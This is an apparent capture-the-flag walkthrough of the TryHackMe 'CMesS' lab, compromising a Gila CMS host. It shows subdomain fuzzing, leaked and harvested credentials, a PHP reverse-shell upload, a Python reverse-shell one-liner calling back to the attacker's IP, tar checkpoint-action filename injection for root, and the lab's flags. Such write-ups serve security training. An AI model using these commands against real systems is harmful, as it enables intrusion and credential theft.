# CMesS 

> VOiD | Sunday 31 October 2021 05:25:44 PM IST

My IP : 10.8.253.221
Target IP : 


## PORT 80 [http : gila CMS]


http://10.10.179.62/robots.txt

```
User-agent: *
Disallow: /src/
Disallow: /themes/
Disallow: /lib/
```

```bash

wfuzz -c -f sub-fighter.txt -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://cmess.thm/" -H "Host: FUZZ.cmess.thm" 

cat sub-fighter.txt | grep -v 107
00019:  C=200     30 L	     104 W	    934 Ch	  "dev"

```

http://dev.cmess.thm
```
andre@cmess.thm


andre@cmess.thm

That's ok, can you guys reset my password if you get a moment, I seem to be unable to get onto the admin panel.
support@cmess.thm

Your password has been reset. Here: KPFTN_f2yxe%
```

http://cmess.thm/admin/fm?f=./assets
Upload a reverse shell
```bash
curl http://cmess.thm/assets/rev.php
```

```php
  array (
    'host' => 'localhost',
    'user' => 'root',
    'pass' => 'r0otus3rpassw0rd',
    'name' => 'gila',
  )
```

```bash
mysql -u root -p

use gila
mysql> select * from user\G;
*************************** 1. row ***************************
        id: 1
  username: andre
     email: andre@cmess.thm
      pass: $2y$10$uNAA0MEze02jd.qU9tnYLu43bNo9nujltElcWEAcifNeZdk4bEsBa
    active: 1
reset_code: 
   created: 2020-02-06 18:20:34
   updated: 2020-02-06 18:20:34

╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
/dev/mqueue
/dev/shm
/opt/.password.bak

www-data@cmess:/var/log$ cat /opt/.password.bak
andres backup password
UQfsdCB7aAP6

andre@cmess:~$ cat user.txt 
thm{c529b5d5d6ab6b430b7eb1903b2b5e1b}

```

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.253.221",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

echo "" > "--checkpoint-action=exec=sh script.sh"
echo "" > --checkpoint=1

root@cmess:~# cat root.txt 
thm{9f85b7fdeb2cf96985bf5761a93546a2}
```